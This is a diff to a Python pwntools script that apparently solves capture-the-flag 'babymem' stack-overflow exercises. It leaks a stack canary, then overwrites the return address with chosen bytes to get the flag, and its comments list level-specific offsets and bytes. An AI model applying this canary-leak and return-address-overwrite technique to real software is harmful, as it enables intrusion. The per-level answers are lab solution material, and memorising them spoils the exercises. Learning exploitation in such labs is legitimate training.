@@ -50,7 +50,7 @@ def bypass_canary(max_n, pre_len, target_n, byte1, byte2, challenge):
     cmd = cmd + target_n + byte1 + byte2 + '" | /challenge/' + challenge
     print(cmd)
 
-def leak_canary(pre_len, byte1, byte2, challenge):
+def leak_canary(pre_len, byte1, byte2, challenge, to_canary = -1):
     p = process('/challenge/' + challenge)
 
     # the first stage is to cause challenge() to leak the canary
@@ -61,17 +61,22 @@ def leak_canary(pre_len, byte1, byte2, challenge):
 
     p.readuntil('You said: ')
     input_canary = p.read()
-    print(input_canary)
+    print(b'leak the canary: ' + input_canary)
     canary = b'\x00' + input_canary[pre_len: pre_len + 7]
     print(canary)
-    
     # the second stage is to overwrite the return address while keep the canary unmodified
     if(b'Payload size' not in input_canary):
         print('read until payload size...')
         p.readuntil('Payload size:')
-    print('?')
-    p.sendline(str(pre_len - 1 + 8 + 8 + 2).encode())
+    if(to_canary < 0):
+        to_canary = pre_len - 1
+    p.sendline(str(to_canary + 8 + 8 + 2).encode())
     p.readuntil('bytes)!\n')
-    p.sendline(b'a' * (pre_len - 1) + canary + b'a' * 8 + byte1 + byte2)
+    p.sendline(b'a' * to_canary + canary + b'a' * 8 + byte1 + byte2)
     p.readuntil('You win! Here is your flag:\n')
     print(p.readline())
+
+# leak_canary(89, b'\xfc', b'\xa1', 'babymem_level12.0')
+# leak_canary(41, b'\x74', b'\x29', 'babymem_level12.1')
+# leak_canary(104 + 1, b'\xf9', b'\xd5', 'babymem_level14.0', to_canary = 376)
+# leak_canary(8 + 1, b'\x10', b'\xc5', 'babymem_level14.1', to_canary = 280)
